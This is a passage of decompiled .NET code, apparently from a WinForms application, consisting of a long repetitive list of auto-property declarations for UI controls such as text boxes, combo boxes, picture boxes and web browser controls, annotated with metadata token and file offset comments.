		// (set) Token: 0x06000996 RID: 2454 RVA: 0x00036563 File Offset: 0x00034763
		internal virtual MaskedTextBox MaskedTextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B4 RID: 1204
		// (get) Token: 0x06000997 RID: 2455 RVA: 0x0003656C File Offset: 0x0003476C
		// (set) Token: 0x06000998 RID: 2456 RVA: 0x00036574 File Offset: 0x00034774
		internal virtual NumericUpDown NumericUpDown7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B5 RID: 1205
		// (get) Token: 0x06000999 RID: 2457 RVA: 0x0003657D File Offset: 0x0003477D
		// (set) Token: 0x0600099A RID: 2458 RVA: 0x00036585 File Offset: 0x00034785
		internal virtual PictureBox PictureBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B6 RID: 1206
		// (get) Token: 0x0600099B RID: 2459 RVA: 0x0003658E File Offset: 0x0003478E
		// (set) Token: 0x0600099C RID: 2460 RVA: 0x00036596 File Offset: 0x00034796
		internal virtual WebBrowser WebBrowser4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B7 RID: 1207
		// (get) Token: 0x0600099D RID: 2461 RVA: 0x0003659F File Offset: 0x0003479F
		// (set) Token: 0x0600099E RID: 2462 RVA: 0x000365A7 File Offset: 0x000347A7
		internal virtual TreeView TreeView4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B8 RID: 1208
		// (get) Token: 0x0600099F RID: 2463 RVA: 0x000365B0 File Offset: 0x000347B0
		// (set) Token: 0x060009A0 RID: 2464 RVA: 0x000365B8 File Offset: 0x000347B8
		internal virtual TextBox TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B9 RID: 1209
		// (get) Token: 0x060009A1 RID: 2465 RVA: 0x000365C1 File Offset: 0x000347C1
		// (set) Token: 0x060009A2 RID: 2466 RVA: 0x000365C9 File Offset: 0x000347C9
		internal virtual RadioButton RadioButton7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BA RID: 1210
		// (get) Token: 0x060009A3 RID: 2467 RVA: 0x000365D2 File Offset: 0x000347D2
		// (set) Token: 0x060009A4 RID: 2468 RVA: 0x000365DA File Offset: 0x000347DA
		internal virtual RadioButton RadioButton8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BB RID: 1211
		// (get) Token: 0x060009A5 RID: 2469 RVA: 0x000365E3 File Offset: 0x000347E3
		// (set) Token: 0x060009A6 RID: 2470 RVA: 0x000365EB File Offset: 0x000347EB
		internal virtual PictureBox PictureBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BC RID: 1212
		// (get) Token: 0x060009A7 RID: 2471 RVA: 0x000365F4 File Offset: 0x000347F4
		// (set) Token: 0x060009A8 RID: 2472 RVA: 0x000365FC File Offset: 0x000347FC
		internal virtual ComboBox ComboBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BD RID: 1213
		// (get) Token: 0x060009A9 RID: 2473 RVA: 0x00036605 File Offset: 0x00034805
		// (set) Token: 0x060009AA RID: 2474 RVA: 0x0003660D File Offset: 0x0003480D
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BE RID: 1214
		// (get) Token: 0x060009AB RID: 2475 RVA: 0x00036616 File Offset: 0x00034816
		// (set) Token: 0x060009AC RID: 2476 RVA: 0x0003661E File Offset: 0x0003481E
		internal virtual ListView ListView4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004BF RID: 1215
		// (get) Token: 0x060009AD RID: 2477 RVA: 0x00036627 File Offset: 0x00034827
		// (set) Token: 0x060009AE RID: 2478 RVA: 0x0003662F File Offset: 0x0003482F
		internal virtual DateTimePicker DateTimePicker7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C0 RID: 1216
		// (get) Token: 0x060009AF RID: 2479 RVA: 0x00036638 File Offset: 0x00034838
		// (set) Token: 0x060009B0 RID: 2480 RVA: 0x00036640 File Offset: 0x00034840
		internal virtual MonthCalendar MonthCalendar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C1 RID: 1217
		// (get) Token: 0x060009B1 RID: 2481 RVA: 0x00036649 File Offset: 0x00034849
		// (set) Token: 0x060009B2 RID: 2482 RVA: 0x00036651 File Offset: 0x00034851
		internal virtual PictureBox PictureBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C2 RID: 1218
		// (get) Token: 0x060009B3 RID: 2483 RVA: 0x0003665A File Offset: 0x0003485A
		// (set) Token: 0x060009B4 RID: 2484 RVA: 0x00036662 File Offset: 0x00034862
		internal virtual NumericUpDown NumericUpDown8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C3 RID: 1219
		// (get) Token: 0x060009B5 RID: 2485 RVA: 0x0003666B File Offset: 0x0003486B
		// (set) Token: 0x060009B6 RID: 2486 RVA: 0x00036673 File Offset: 0x00034873
		internal virtual ProgressBar ProgressBar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C4 RID: 1220
		// (get) Token: 0x060009B7 RID: 2487 RVA: 0x0003667C File Offset: 0x0003487C
		// (set) Token: 0x060009B8 RID: 2488 RVA: 0x00036684 File Offset: 0x00034884
		internal virtual PictureBox PictureBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C5 RID: 1221
		// (get) Token: 0x060009B9 RID: 2489 RVA: 0x0003668D File Offset: 0x0003488D
		// (set) Token: 0x060009BA RID: 2490 RVA: 0x00036695 File Offset: 0x00034895
		internal virtual MaskedTextBox MaskedTextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C6 RID: 1222
		// (get) Token: 0x060009BB RID: 2491 RVA: 0x0003669E File Offset: 0x0003489E
		// (set) Token: 0x060009BC RID: 2492 RVA: 0x000366A6 File Offset: 0x000348A6
		internal virtual ComboBox ComboBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C7 RID: 1223
		// (get) Token: 0x060009BD RID: 2493 RVA: 0x000366AF File Offset: 0x000348AF
		// (set) Token: 0x060009BE RID: 2494 RVA: 0x000366B7 File Offset: 0x000348B7
		internal virtual CheckedListBox CheckedListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C8 RID: 1224
		// (get) Token: 0x060009BF RID: 2495 RVA: 0x000366C0 File Offset: 0x000348C0
		// (set) Token: 0x060009C0 RID: 2496 RVA: 0x000366C8 File Offset: 0x000348C8
		internal virtual DateTimePicker DateTimePicker8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004C9 RID: 1225
		// (get) Token: 0x060009C1 RID: 2497 RVA: 0x000366D1 File Offset: 0x000348D1
		// (set) Token: 0x060009C2 RID: 2498 RVA: 0x000366D9 File Offset: 0x000348D9
		internal virtual CheckedListBox CheckedListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CA RID: 1226
		// (get) Token: 0x060009C3 RID: 2499 RVA: 0x000366E2 File Offset: 0x000348E2
		// (set) Token: 0x060009C4 RID: 2500 RVA: 0x000366EA File Offset: 0x000348EA
		internal virtual CheckedListBox CheckedListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CB RID: 1227
		// (get) Token: 0x060009C5 RID: 2501 RVA: 0x000366F3 File Offset: 0x000348F3
		// (set) Token: 0x060009C6 RID: 2502 RVA: 0x000366FB File Offset: 0x000348FB
		internal virtual MaskedTextBox MaskedTextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CC RID: 1228
		// (get) Token: 0x060009C7 RID: 2503 RVA: 0x00036704 File Offset: 0x00034904
		// (set) Token: 0x060009C8 RID: 2504 RVA: 0x0003670C File Offset: 0x0003490C
		internal virtual NumericUpDown NumericUpDown9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CD RID: 1229
		// (get) Token: 0x060009C9 RID: 2505 RVA: 0x00036715 File Offset: 0x00034915
		// (set) Token: 0x060009CA RID: 2506 RVA: 0x0003671D File Offset: 0x0003491D
		internal virtual PictureBox PictureBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CE RID: 1230
		// (get) Token: 0x060009CB RID: 2507 RVA: 0x00036726 File Offset: 0x00034926
		// (set) Token: 0x060009CC RID: 2508 RVA: 0x0003672E File Offset: 0x0003492E
		internal virtual WebBrowser WebBrowser5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004CF RID: 1231
		// (get) Token: 0x060009CD RID: 2509 RVA: 0x00036737 File Offset: 0x00034937
		// (set) Token: 0x060009CE RID: 2510 RVA: 0x0003673F File Offset: 0x0003493F
		internal virtual TreeView TreeView5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D0 RID: 1232
		// (get) Token: 0x060009CF RID: 2511 RVA: 0x00036748 File Offset: 0x00034948
		// (set) Token: 0x060009D0 RID: 2512 RVA: 0x00036750 File Offset: 0x00034950
		internal virtual TextBox TextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D1 RID: 1233
		// (get) Token: 0x060009D1 RID: 2513 RVA: 0x00036759 File Offset: 0x00034959
		// (set) Token: 0x060009D2 RID: 2514 RVA: 0x00036761 File Offset: 0x00034961
		internal virtual RadioButton RadioButton9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D2 RID: 1234
		// (get) Token: 0x060009D3 RID: 2515 RVA: 0x0003676A File Offset: 0x0003496A
		// (set) Token: 0x060009D4 RID: 2516 RVA: 0x00036772 File Offset: 0x00034972
		internal virtual RadioButton RadioButton10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D3 RID: 1235
		// (get) Token: 0x060009D5 RID: 2517 RVA: 0x0003677B File Offset: 0x0003497B
		// (set) Token: 0x060009D6 RID: 2518 RVA: 0x00036783 File Offset: 0x00034983
		internal virtual PictureBox PictureBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D4 RID: 1236
		// (get) Token: 0x060009D7 RID: 2519 RVA: 0x0003678C File Offset: 0x0003498C
		// (set) Token: 0x060009D8 RID: 2520 RVA: 0x00036794 File Offset: 0x00034994
		internal virtual ComboBox ComboBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D5 RID: 1237
		// (get) Token: 0x060009D9 RID: 2521 RVA: 0x0003679D File Offset: 0x0003499D
		// (set) Token: 0x060009DA RID: 2522 RVA: 0x000367A5 File Offset: 0x000349A5
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D6 RID: 1238
		// (get) Token: 0x060009DB RID: 2523 RVA: 0x000367AE File Offset: 0x000349AE
		// (set) Token: 0x060009DC RID: 2524 RVA: 0x000367B6 File Offset: 0x000349B6
		internal virtual ListView ListView5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D7 RID: 1239
		// (get) Token: 0x060009DD RID: 2525 RVA: 0x000367BF File Offset: 0x000349BF
		// (set) Token: 0x060009DE RID: 2526 RVA: 0x000367C7 File Offset: 0x000349C7
		internal virtual DateTimePicker DateTimePicker9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D8 RID: 1240
		// (get) Token: 0x060009DF RID: 2527 RVA: 0x000367D0 File Offset: 0x000349D0
		// (set) Token: 0x060009E0 RID: 2528 RVA: 0x000367D8 File Offset: 0x000349D8
		internal virtual MonthCalendar MonthCalendar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004D9 RID: 1241
		// (get) Token: 0x060009E1 RID: 2529 RVA: 0x000367E1 File Offset: 0x000349E1
		// (set) Token: 0x060009E2 RID: 2530 RVA: 0x000367E9 File Offset: 0x000349E9
		internal virtual PictureBox PictureBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DA RID: 1242
		// (get) Token: 0x060009E3 RID: 2531 RVA: 0x000367F2 File Offset: 0x000349F2
		// (set) Token: 0x060009E4 RID: 2532 RVA: 0x000367FA File Offset: 0x000349FA
		internal virtual NumericUpDown NumericUpDown10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DB RID: 1243
		// (get) Token: 0x060009E5 RID: 2533 RVA: 0x00036803 File Offset: 0x00034A03
		// (set) Token: 0x060009E6 RID: 2534 RVA: 0x0003680B File Offset: 0x00034A0B
		internal virtual ProgressBar ProgressBar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DC RID: 1244
		// (get) Token: 0x060009E7 RID: 2535 RVA: 0x00036814 File Offset: 0x00034A14
		// (set) Token: 0x060009E8 RID: 2536 RVA: 0x0003681C File Offset: 0x00034A1C
		internal virtual PictureBox PictureBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DD RID: 1245
		// (get) Token: 0x060009E9 RID: 2537 RVA: 0x00036825 File Offset: 0x00034A25
		// (set) Token: 0x060009EA RID: 2538 RVA: 0x0003682D File Offset: 0x00034A2D
		internal virtual MaskedTextBox MaskedTextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DE RID: 1246
		// (get) Token: 0x060009EB RID: 2539 RVA: 0x00036836 File Offset: 0x00034A36
		// (set) Token: 0x060009EC RID: 2540 RVA: 0x0003683E File Offset: 0x00034A3E
		internal virtual ComboBox ComboBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004DF RID: 1247
		// (get) Token: 0x060009ED RID: 2541 RVA: 0x00036847 File Offset: 0x00034A47
		// (set) Token: 0x060009EE RID: 2542 RVA: 0x0003684F File Offset: 0x00034A4F
		internal virtual CheckedListBox CheckedListBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E0 RID: 1248
		// (get) Token: 0x060009EF RID: 2543 RVA: 0x00036858 File Offset: 0x00034A58
		// (set) Token: 0x060009F0 RID: 2544 RVA: 0x00036860 File Offset: 0x00034A60
		internal virtual DateTimePicker DateTimePicker10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E1 RID: 1249
		// (get) Token: 0x060009F1 RID: 2545 RVA: 0x00036869 File Offset: 0x00034A69
		// (set) Token: 0x060009F2 RID: 2546 RVA: 0x00036871 File Offset: 0x00034A71
		internal virtual CheckedListBox CheckedListBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E2 RID: 1250
		// (get) Token: 0x060009F3 RID: 2547 RVA: 0x0003687A File Offset: 0x00034A7A
		// (set) Token: 0x060009F4 RID: 2548 RVA: 0x00036882 File Offset: 0x00034A82
		internal virtual CheckedListBox CheckedListBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E3 RID: 1251
		// (get) Token: 0x060009F5 RID: 2549 RVA: 0x0003688B File Offset: 0x00034A8B
		// (set) Token: 0x060009F6 RID: 2550 RVA: 0x00036893 File Offset: 0x00034A93
		internal virtual MaskedTextBox MaskedTextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E4 RID: 1252
		// (get) Token: 0x060009F7 RID: 2551 RVA: 0x0003689C File Offset: 0x00034A9C
		// (set) Token: 0x060009F8 RID: 2552 RVA: 0x000368A4 File Offset: 0x00034AA4
		internal virtual NumericUpDown NumericUpDown11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E5 RID: 1253
		// (get) Token: 0x060009F9 RID: 2553 RVA: 0x000368AD File Offset: 0x00034AAD
		// (set) Token: 0x060009FA RID: 2554 RVA: 0x000368B5 File Offset: 0x00034AB5
		internal virtual PictureBox PictureBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E6 RID: 1254
		// (get) Token: 0x060009FB RID: 2555 RVA: 0x000368BE File Offset: 0x00034ABE
		// (set) Token: 0x060009FC RID: 2556 RVA: 0x000368C6 File Offset: 0x00034AC6
		internal virtual WebBrowser WebBrowser6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E7 RID: 1255
		// (get) Token: 0x060009FD RID: 2557 RVA: 0x000368CF File Offset: 0x00034ACF
		// (set) Token: 0x060009FE RID: 2558 RVA: 0x000368D7 File Offset: 0x00034AD7
		internal virtual TreeView TreeView6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E8 RID: 1256
		// (get) Token: 0x060009FF RID: 2559 RVA: 0x000368E0 File Offset: 0x00034AE0
		// (set) Token: 0x06000A00 RID: 2560 RVA: 0x000368E8 File Offset: 0x00034AE8
		internal virtual TextBox TextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004E9 RID: 1257
		// (get) Token: 0x06000A01 RID: 2561 RVA: 0x000368F1 File Offset: 0x00034AF1
		// (set) Token: 0x06000A02 RID: 2562 RVA: 0x000368F9 File Offset: 0x00034AF9
		internal virtual RadioButton RadioButton11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004EA RID: 1258
		// (get) Token: 0x06000A03 RID: 2563 RVA: 0x00036902 File Offset: 0x00034B02
		// (set) Token: 0x06000A04 RID: 2564 RVA: 0x0003690A File Offset: 0x00034B0A
		internal virtual RadioButton RadioButton12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004EB RID: 1259
		// (get) Token: 0x06000A05 RID: 2565 RVA: 0x00036913 File Offset: 0x00034B13
		// (set) Token: 0x06000A06 RID: 2566 RVA: 0x0003691B File Offset: 0x00034B1B
		internal virtual PictureBox PictureBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004EC RID: 1260
		// (get) Token: 0x06000A07 RID: 2567 RVA: 0x00036924 File Offset: 0x00034B24
		// (set) Token: 0x06000A08 RID: 2568 RVA: 0x0003692C File Offset: 0x00034B2C
		internal virtual ComboBox ComboBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004ED RID: 1261
		// (get) Token: 0x06000A09 RID: 2569 RVA: 0x00036935 File Offset: 0x00034B35
		// (set) Token: 0x06000A0A RID: 2570 RVA: 0x0003693D File Offset: 0x00034B3D
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004EE RID: 1262
		// (get) Token: 0x06000A0B RID: 2571 RVA: 0x00036946 File Offset: 0x00034B46
		// (set) Token: 0x06000A0C RID: 2572 RVA: 0x0003694E File Offset: 0x00034B4E
		internal virtual ListView ListView6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004EF RID: 1263
		// (get) Token: 0x06000A0D RID: 2573 RVA: 0x00036957 File Offset: 0x00034B57
		// (set) Token: 0x06000A0E RID: 2574 RVA: 0x0003695F File Offset: 0x00034B5F
		internal virtual DateTimePicker DateTimePicker11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F0 RID: 1264
		// (get) Token: 0x06000A0F RID: 2575 RVA: 0x00036968 File Offset: 0x00034B68
		// (set) Token: 0x06000A10 RID: 2576 RVA: 0x00036970 File Offset: 0x00034B70
		internal virtual MonthCalendar MonthCalendar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F1 RID: 1265
		// (get) Token: 0x06000A11 RID: 2577 RVA: 0x00036979 File Offset: 0x00034B79
		// (set) Token: 0x06000A12 RID: 2578 RVA: 0x00036981 File Offset: 0x00034B81
		internal virtual PictureBox PictureBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F2 RID: 1266
		// (get) Token: 0x06000A13 RID: 2579 RVA: 0x0003698A File Offset: 0x00034B8A
		// (set) Token: 0x06000A14 RID: 2580 RVA: 0x00036992 File Offset: 0x00034B92
		internal virtual NumericUpDown NumericUpDown12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F3 RID: 1267
		// (get) Token: 0x06000A15 RID: 2581 RVA: 0x0003699B File Offset: 0x00034B9B
		// (set) Token: 0x06000A16 RID: 2582 RVA: 0x000369A3 File Offset: 0x00034BA3
		internal virtual ProgressBar ProgressBar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F4 RID: 1268
		// (get) Token: 0x06000A17 RID: 2583 RVA: 0x000369AC File Offset: 0x00034BAC
		// (set) Token: 0x06000A18 RID: 2584 RVA: 0x000369B4 File Offset: 0x00034BB4
		internal virtual PictureBox PictureBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F5 RID: 1269
		// (get) Token: 0x06000A19 RID: 2585 RVA: 0x000369BD File Offset: 0x00034BBD
		// (set) Token: 0x06000A1A RID: 2586 RVA: 0x000369C5 File Offset: 0x00034BC5
		internal virtual MaskedTextBox MaskedTextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F6 RID: 1270
		// (get) Token: 0x06000A1B RID: 2587 RVA: 0x000369CE File Offset: 0x00034BCE
		// (set) Token: 0x06000A1C RID: 2588 RVA: 0x000369D6 File Offset: 0x00034BD6
		internal virtual ComboBox ComboBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F7 RID: 1271
		// (get) Token: 0x06000A1D RID: 2589 RVA: 0x000369DF File Offset: 0x00034BDF
		// (set) Token: 0x06000A1E RID: 2590 RVA: 0x000369E7 File Offset: 0x00034BE7
		internal virtual CheckedListBox CheckedListBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F8 RID: 1272
		// (get) Token: 0x06000A1F RID: 2591 RVA: 0x000369F0 File Offset: 0x00034BF0
		// (set) Token: 0x06000A20 RID: 2592 RVA: 0x000369F8 File Offset: 0x00034BF8
		internal virtual DateTimePicker DateTimePicker12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004F9 RID: 1273
		// (get) Token: 0x06000A21 RID: 2593 RVA: 0x00036A01 File Offset: 0x00034C01
		// (set) Token: 0x06000A22 RID: 2594 RVA: 0x00036A09 File Offset: 0x00034C09
		internal virtual CheckedListBox CheckedListBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FA RID: 1274
		// (get) Token: 0x06000A23 RID: 2595 RVA: 0x00036A12 File Offset: 0x00034C12
		// (set) Token: 0x06000A24 RID: 2596 RVA: 0x00036A1A File Offset: 0x00034C1A
		internal virtual CheckedListBox CheckedListBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FB RID: 1275
		// (get) Token: 0x06000A25 RID: 2597 RVA: 0x00036A23 File Offset: 0x00034C23
		// (set) Token: 0x06000A26 RID: 2598 RVA: 0x00036A2B File Offset: 0x00034C2B
		internal virtual MaskedTextBox MaskedTextBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FC RID: 1276
		// (get) Token: 0x06000A27 RID: 2599 RVA: 0x00036A34 File Offset: 0x00034C34
		// (set) Token: 0x06000A28 RID: 2600 RVA: 0x00036A3C File Offset: 0x00034C3C
		internal virtual NumericUpDown NumericUpDown13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FD RID: 1277
		// (get) Token: 0x06000A29 RID: 2601 RVA: 0x00036A45 File Offset: 0x00034C45
		// (set) Token: 0x06000A2A RID: 2602 RVA: 0x00036A4D File Offset: 0x00034C4D
		internal virtual PictureBox PictureBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FE RID: 1278
		// (get) Token: 0x06000A2B RID: 2603 RVA: 0x00036A56 File Offset: 0x00034C56
		// (set) Token: 0x06000A2C RID: 2604 RVA: 0x00036A5E File Offset: 0x00034C5E
		internal virtual WebBrowser WebBrowser7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004FF RID: 1279
		// (get) Token: 0x06000A2D RID: 2605 RVA: 0x00036A67 File Offset: 0x00034C67
		// (set) Token: 0x06000A2E RID: 2606 RVA: 0x00036A6F File Offset: 0x00034C6F
		internal virtual TreeView TreeView7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000500 RID: 1280
		// (get) Token: 0x06000A2F RID: 2607 RVA: 0x00036A78 File Offset: 0x00034C78
		// (set) Token: 0x06000A30 RID: 2608 RVA: 0x00036A80 File Offset: 0x00034C80
		internal virtual TextBox TextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000501 RID: 1281
		// (get) Token: 0x06000A31 RID: 2609 RVA: 0x00036A89 File Offset: 0x00034C89
		// (set) Token: 0x06000A32 RID: 2610 RVA: 0x00036A91 File Offset: 0x00034C91
		internal virtual RadioButton RadioButton13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000502 RID: 1282
		// (get) Token: 0x06000A33 RID: 2611 RVA: 0x00036A9A File Offset: 0x00034C9A
		// (set) Token: 0x06000A34 RID: 2612 RVA: 0x00036AA2 File Offset: 0x00034CA2
		internal virtual RadioButton RadioButton14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000503 RID: 1283
		// (get) Token: 0x06000A35 RID: 2613 RVA: 0x00036AAB File Offset: 0x00034CAB
		// (set) Token: 0x06000A36 RID: 2614 RVA: 0x00036AB3 File Offset: 0x00034CB3
		internal virtual PictureBox PictureBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000504 RID: 1284
		// (get) Token: 0x06000A37 RID: 2615 RVA: 0x00036ABC File Offset: 0x00034CBC
		// (set) Token: 0x06000A38 RID: 2616 RVA: 0x00036AC4 File Offset: 0x00034CC4
		internal virtual ComboBox ComboBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000505 RID: 1285
		// (get) Token: 0x06000A39 RID: 2617 RVA: 0x00036ACD File Offset: 0x00034CCD
		// (set) Token: 0x06000A3A RID: 2618 RVA: 0x00036AD5 File Offset: 0x00034CD5
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000506 RID: 1286
		// (get) Token: 0x06000A3B RID: 2619 RVA: 0x00036ADE File Offset: 0x00034CDE
		// (set) Token: 0x06000A3C RID: 2620 RVA: 0x00036AE6 File Offset: 0x00034CE6
		internal virtual ListView ListView7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000507 RID: 1287
		// (get) Token: 0x06000A3D RID: 2621 RVA: 0x00036AEF File Offset: 0x00034CEF
		// (set) Token: 0x06000A3E RID: 2622 RVA: 0x00036AF7 File Offset: 0x00034CF7
		internal virtual DateTimePicker DateTimePicker13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000508 RID: 1288
		// (get) Token: 0x06000A3F RID: 2623 RVA: 0x00036B00 File Offset: 0x00034D00
		// (set) Token: 0x06000A40 RID: 2624 RVA: 0x00036B08 File Offset: 0x00034D08
		internal virtual MonthCalendar MonthCalendar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000509 RID: 1289
		// (get) Token: 0x06000A41 RID: 2625 RVA: 0x00036B11 File Offset: 0x00034D11
		// (set) Token: 0x06000A42 RID: 2626 RVA: 0x00036B19 File Offset: 0x00034D19
		internal virtual PictureBox PictureBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050A RID: 1290
		// (get) Token: 0x06000A43 RID: 2627 RVA: 0x00036B22 File Offset: 0x00034D22
		// (set) Token: 0x06000A44 RID: 2628 RVA: 0x00036B2A File Offset: 0x00034D2A
		internal virtual NumericUpDown NumericUpDown14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050B RID: 1291
		// (get) Token: 0x06000A45 RID: 2629 RVA: 0x00036B33 File Offset: 0x00034D33
		// (set) Token: 0x06000A46 RID: 2630 RVA: 0x00036B3B File Offset: 0x00034D3B
		internal virtual ProgressBar ProgressBar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050C RID: 1292
		// (get) Token: 0x06000A47 RID: 2631 RVA: 0x00036B44 File Offset: 0x00034D44
		// (set) Token: 0x06000A48 RID: 2632 RVA: 0x00036B4C File Offset: 0x00034D4C
		internal virtual PictureBox PictureBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050D RID: 1293
		// (get) Token: 0x06000A49 RID: 2633 RVA: 0x00036B55 File Offset: 0x00034D55
		// (set) Token: 0x06000A4A RID: 2634 RVA: 0x00036B5D File Offset: 0x00034D5D
		internal virtual MaskedTextBox MaskedTextBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050E RID: 1294
		// (get) Token: 0x06000A4B RID: 2635 RVA: 0x00036B66 File Offset: 0x00034D66
